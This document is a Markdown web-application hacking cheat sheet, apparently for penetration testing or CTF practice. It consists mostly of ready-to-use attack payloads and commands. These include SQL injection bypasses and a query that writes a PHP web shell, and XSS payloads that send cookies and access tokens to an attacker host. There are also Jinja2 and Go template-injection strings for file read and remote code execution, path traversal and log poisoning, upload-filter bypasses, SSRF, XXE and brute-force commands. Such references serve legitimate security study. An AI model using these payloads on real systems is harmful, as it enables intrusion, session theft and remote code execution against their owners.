# Web-Applications

- [Web-Applications](#web-applications)
  - [Recon](#recon)
  - [SQL-Injection](#sql-injection)
    - [Authentication bypass](#authentication-bypass)
    - [sqlmap](#sqlmap)
    - [UNION based](#union-based)
    - [Write to file](#write-to-file)
  - [Cross-Site-Scripting](#cross-site-scripting)
  - [Server Side Template Injection](#server-side-template-injection)
    - [Jinja2](#jinja2)
    - [Go](#go)
  - [File Inclusion / Path traversal](#file-inclusion--path-traversal)
    - [PHP Backend](#php-backend)
  - [File Upload](#file-upload)
    - [Filters](#filters)
    - [Zip File Upload](#zip-file-upload)
  - [Server Side Request Forgery](#server-side-request-forgery)
    - [Localhost Bypass](#localhost-bypass)
    - [Protocols](#protocols)
  - [Regex Bypass](#regex-bypass)
  - [NoSQL-Injection](#nosql-injection)
  - [XML External Entities](#xml-external-entities)
  - [JSON Web Tokens](#json-web-tokens)
  - [Wordpress](#wordpress)
  - [Brute Force Login](#brute-force-login)

## Recon

- web directories
  ```
  gobuster dir -u <url> -w <wordlist> -x php,html
  feroxbuster -u <url> -w <wordlist> -x php,html
  ```
- subdomains
  ```
  gobuster vhost -u <url> -w <wordlist> --append-domain
  ffuf -u <url> -w <wordlist> -H "Host:FUZZ.<domain>" -fc <filter-status-code>
  ```
- find query parameters for URL endpoints
  ```
  arjun -u <url>
  ```
- ``/robots.txt`` and ``/sitemap.xml``
- view source ``CTRL+U``
- view storage/cookies
- response headers
- 404 error page: [default pages](https://0xdf.gitlab.io/cheatsheets/404)
- ``Wappalyzer`` (Browser Plugin): technologies used by a website
- ``nikto -h <url>``: web application vulnerabilities
- ``/.git/`` $\Rightarrow$ [git-dumper](https://github.com/arthaud/git-dumper)

## SQL-Injection

### Authentication bypass
```
' or 1=1 #
' or '1'='1' #
" or 1=1 -- -
```

### sqlmap
```
sqlmap -u <url> --forms
sqlmap -r request.txt --level 5 --risk 3 --batch
sqlmap -u <url> --os-shell
```

### UNION based
- Detect columns number (increment the number)
  - ``' ORDER BY 1--``
  - ``' GROUP BY 1--``
- Extract databases, tables, columns and data
  ```sql
  UNION SELECT 1,2,3,4,...,GROUP_CONCAT(schema_name) FROM information_schema.schemata
  UNION SELECT 1,2,3,4,...,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=<database>
  UNION SELECT 1,2,3,4,...,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=<table>
  UNION SELECT 1,2,3,4,...,GROUP_CONCAT(id,username,password) FROM users
  ```

### Write to file
```sql
UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO outfile "/var/www/shell.php"
```

## Cross-Site-Scripting
    
```html
<script>alert("XSS")</script>
<img src=x onerror=this.src="http://<lhost>:<lport>/?c="+document.cookie>
<script>document.location='http://<lhost>:<lport>/?c='+document.cookie</script>
<script>document.location='http://<lhost>:<lport>/?c='+localStorage.getItem('access_token')</script>
```

## Server Side Template Injection

- input is reflected in response
- ``{{7*7}}`` $\Rightarrow$ 49?
- FUZZ string: ``${{<%[%'"}}%\.``
- [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

### Jinja2
```
{{ config.items() }}

# Read file
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# Write file
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/root/.ssh/authorized_keys', 'w').write('Hello World') }}

# RCE
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("id")["read"]() %} a {% endwith %}
```

### Go
```
{{html "ssti"}}

# Reveal the data structure input
{{ . }}

# RCE
{{ .System "id" }}
```

## File Inclusion / Path traversal

- example: ``http://example.com/index.php?page=home.html``
- interesting files:
  - ``/etc/passwd``: users and home directories
  - ``/etc/apache2/sites-enabled/000-default.conf``: default Apache configuration
  - ``/proc/self/cmdline``, ``/proc/self/environ``, ``/proc/self/status``
  - ssh keys
  - web-app files e.g. ``.htaccess`` and ``config.php`` 
- traversal strings
  ```
  ../
  ..//
  ....//
  %2e%2e%2f
  %252e%252e%252f
  ```

### PHP Backend
- Wrappers
  - ``php://filter/convert.base64-encode/resource=index.php``
  - ``expect://id``
  - ``phar://exploit.zip/shell``: upload phar/zip archive and execute PHP file in the archive
- [PHP filter chain](https://github.com/synacktiv/php_filter_chain_generator)
- Log Poisoning
  - Send request with PHP shell in the User-Agent and include the log file
    ```
    /var/log/apache2/access.log
    /var/log/apache/access.log
    /var/log/apache2/error.log
    /var/log/apache/error.log
    /var/log/nginx/access.log
    /var/log/nginx/error.log
    ```

## File Upload

### Filters
- file extension
	- upload file with allowed extension and rename the file
  - double extension e.g. ``shell.php.jpg``
  - null byte: ``shell.php%00.jpg``
  - blacklist $\Rightarrow$ try alternative extensions
  	- PHP: pHP,phtml, pht, php3, php4, ...
  	- ASP: asp, aspx
- Content-Type Header
	- change header to allowed type e.g. ``image/jpeg``
- magic bytes
	- change magic bytes in hex editor
	- [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

### Zip File Upload
- upload zip file with symlinks $\Rightarrow$ file read
- write files with path traversal through file names e.g. file with name ``../../../../../root/.ssh/authorized_keys``
- zip file upload + LFI + PHP backend $\Rightarrow$ phar injection

## Server Side Request Forgery

- try to access internal websites or resources
- fuzz for internal open ports

### Localhost Bypass

```
http://localhost:80/
http://127.0.0.1:80/
http://127.0.1:80/
http://127.1:80/
http://127.000000000000000.1:80/
http://0:80/
http:@0:80/
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]:80/
```

### Protocols

- ``file://``: read local file
- ``http://``: perform http request
- ``dict://``: access word lists
- ``sftp://``: connect to sftp server

## Regex Bypass
- Example: ``^[0-9a-z]+$`` without multi-line option
- Regex only checks first line $\Rightarrow$ bypass check with a linefeed
```
abc%0d%0a<script>alert("xss")</script>
abc%0d%0a{{7*7}}
```

## NoSQL-Injection

```
admin' || '1'=='1

username[$ne]=foo&password[$ne]=foo
{"username": {"$ne": "foo"}, "password": {"$ne": "foo"} }
```

## XML External Entities

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
<entry>&passwd;</entry>
```

## JSON Web Tokens

- [jwt.io](https://jwt.io/)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
  ```sh
  python3 jwt_tool.py -t https://<rhost/ -rh "Authorization: Bearer <token>" -M at -cv "Welcome user!"
  ```
- check if the server verifies the signature

## Wordpress

```
wpscan --url <url> -e u,t,p
wpscan --url <url> -U <users> -P <passwords> -t 50
```
- RCE: add PHP shell to theme

## Brute Force Login

```
hydra -L <users> -P <passwords> <rhost> http-post-form "<path>:username=^USER^&password=^PASS^:<failure-string>"
```
